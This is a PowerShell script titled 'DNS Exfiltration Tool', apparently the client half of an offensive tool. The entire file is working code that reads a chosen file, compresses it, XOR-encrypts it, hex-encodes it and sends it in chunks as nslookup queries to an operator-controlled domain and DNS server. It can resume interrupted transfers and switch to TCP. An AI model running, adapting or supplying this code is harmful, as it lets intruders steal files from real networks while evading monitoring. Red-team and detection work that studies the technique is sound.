# Title: DNS Exfiltration Tool
# Author: lefayjey

param (
    [string]$FilePath,
    [string]$Domain,
    [string]$DnsServerIp,
    [string]$Password,
    [switch]$UseTcp
)

function Show-Help {
    Write-Host "Usage: .\exfil_client.ps1 -FilePath <file_path> -Password <password> [-Domain <domain>] [-DnsServerIp <dns_server_ip>] [-UseTcp]"
    Write-Host "Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries."
    Write-Host ""
    Write-Host "Parameters:"
    Write-Host "  -FilePath      Path to the file you want to exfiltrate."
    Write-Host "  -Password      Password to be used in XOR encryption."
    Write-Host "  -Domain        Domain to use in DNS queries."
    Write-Host "  -DnsServerIp   IP address of the DNS server."
    Write-Host "  -UseTcp        Optional switch to use TCP instead of UDP."
    Write-Host ""
    Write-Host "Example:"
    Write-Host '  .\exfil_client.ps1 -FilePath "C:\path\to\your\file" -Domain "example.com" -DnsServerIp "8.8.8.8" -Password "securepass" -UseTcp'
}

# Check if all required parameters are provided
if (-not $FilePath -or -not $Password -or -not (Test-Path $FilePath)) {
    Show-Help
    exit 1
}

   Write-Host "       __                     _____ __         ___            __ "
   Write-Host "  ____/ /___  ________  _  __/ __(_) /   _____/ (_)__  ____  / /_"
   Write-Host " / __  / __ \/ ___/ _ \| |/_/ /_/ / /   / ___/ / / _ \/ __ \/ __/"
   Write-Host "/ /_/ / / / (__  )  __/>  </ __/ / /   / /__/ / /  __/ / / / /_  "
   Write-Host "\__,_/_/ /_/____/\___/_/|_/_/ /_/_/____\___/_/_/\___/_/ /_/\__/  "
   Write-Host "                                 /_____/                         "
   Write-Host "Author: lefayjey"
   Write-Host "Version: 1.2.0"
   Write-Host ""

# Function to XOR encrypt with password
function XOR-Encrypt {
    param (
        [byte[]]$data,
        [byte[]]$password
    )
    # Encrypt data with password
    $encryptedData = New-Object byte[] $data.Length
    for ($i = 0; $i -lt $data.Length; $i++) {
        $encryptedData[$i] = $data[$i] -bxor $password[$i % $password.Length]
    }
    return $encryptedData
}


# Get filename from FilePath
$filename = Split-Path -Leaf $FilePath
$status_file = "$($filename)_transfer_status.log"

# Calculate MD5 checksum
$md5_checksum = (Get-FileHash -Path $FilePath -Algorithm MD5).Hash
Write-Host "[+] MD5 checksum: [$md5_checksum $FilePath]"

$chunk_id = 0
$randnum = Get-Random -Minimum 1 -Maximum 999999

# Check if status file exists
if (Test-Path $status_file) {
    $status = Get-Content $status_file | ConvertFrom-Json
    Write-Host "[!] A previous transfer was interrupted: $status)"
    $resume = Read-Host "[?] Do you want to resume the transfer? (yes/no)"
    if ($resume -ne "yes") {
        Remove-Item $status_file
    } else {
        $chunk_id = [int]$status.chunk_id
        $randnum = [int]$status.randnum
        if ($status.md5_checksum -ne $md5_checksum) {
            Write-Host "[!] File has changed. Starting a new transfer."
            Remove-Item $status_file
        }
    }
}

# Read file content as bytes
$data = [System.IO.File]::ReadAllBytes($FilePath)

# Compress data using gzip
$compressedStream = New-Object System.IO.MemoryStream
$gzipStream = New-Object System.IO.Compression.GZipStream $compressedStream, ([IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($data, 0, $data.Length)
$gzipStream.Close()

# Get compressed data as byte array
$compressedData = $compressedStream.ToArray()

Write-Host "[*] Encrypting file, please wait..."
# XOR encrypt compressed data with password
$passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($Password)
$encryptedData = XOR-Encrypt -data $compressedData -password $passwordBytes

# Convert encryptedData to hexadecimal string
$hexencryptedData = -join ($encryptedData | ForEach-Object { "{0:X2}" -f $_ })

# Maximum DNS query size constraints
$chunkMaxSize = 63
$requestMaxSize = 255

# Calculate space required for domain name and metadata
$domainNameLength = $Domain.Length + 3 #including the dots
$filenameBytes = [System.Text.Encoding]::UTF8.GetBytes($filename)
$encryptedFilename = XOR-Encrypt -data $filenameBytes -password $passwordBytes
$hex_filename = -join ($encryptedFilename | ForEach-Object { "{0:X2}" -f [byte][char]$_ })
$metadataLength = $hex_filename.Length + 23 #including the dots, and the metadata separators, Maximum of 100000 chunks = 20 MB

# Calculate maximum bytes available for data in each DNS query
$chunks_bytes = $requestMaxSize - $metadataLength - $domainNameLength

# Calculate number of chunks
$nbChunks = [math]::Ceiling($hexencryptedData.Length / $chunks_bytes)

#Construct metadata
$metadata = "$hex_filename|$randnum|$nbChunks"

Write-Host "[+] Maximum data exfiltrated per DNS request (chunk max size): [$chunks_bytes] bytes"
Write-Host "[+] Number of chunks: [$nbChunks]"

# Calculate start index based on chunk_id
$start_index = $chunk_id * $chunks_bytes

Write-Host "[*] Sending file, please wait..."

while ($chunk_id -lt $nbChunks) {
    # Get the chunk from the encrypted data string
    $end_index = [Math]::Min($start_index + $chunks_bytes, $hexencryptedData.Length)
    $chunk = $hexencryptedData.Substring($start_index, $end_index - $start_index)

    # Split hex_chunk into 4 equal chunks
    $chunkLength = [Math]::Ceiling($chunk.Length / 4)
    $chunks = @()

    for ($i = 0; $i -lt 4; $i++) {
        $startIndex = $i * $chunkLength
        $length = [Math]::Min($chunkLength, $chunk.Length - $startIndex)
        $chunks += $chunk.Substring($startIndex, $length)
    }

    # Construct DNS query
    $dnsquery = "$chunk_id.$($chunks[0]).$($chunks[1]).$($chunks[2]).$($chunks[3]).$metadata.$Domain."

    # Determine if -UseTcp switch is present
    $queryType = if ($UseTcp.IsPresent) { "-vc" } else { "" }
    
    # Retry logic for DNS query
    $max_retries = 5
    $retry_count = 0
    $success = $false

    while ($retry_count -lt $max_retries -and -not $success) {
        $output = nslookup $queryType -type=a $dnsquery $DnsServerIp 2>&1
        if (-not $output.Contains("DNS request timed out.")) {
            $success = $true
        } else {
            $retry_count++
            Write-Host "[*] Timeout occurred, retrying $retry_count/$max_retries..."
            Start-Sleep -Seconds 3
        }
    }

    # Update status file
    $status = @{
        chunk_id = [string]$chunk_id
        randnum = [string]$randnum
        file = $filename
        md5_checksum = $md5_checksum
    }
    $status | ConvertTo-Json | Out-File $status_file

    if (-not $success) {
        Write-Host "[!] Failed to send DNS query after multiple retries."
        exit 1
    }

    Write-Progress -Activity "Sending file in Progress" -Status "$chunk_id/$nbChunks chunks completed:" -PercentComplete ($chunk_id / $nbChunks * 100)

    # Move to next chunk
    $chunk_id++
    $start_index = $end_index
}

# Clean up status file after successful transfer
Remove-Item $status_file

Write-Host "[+] Transfer complete!"
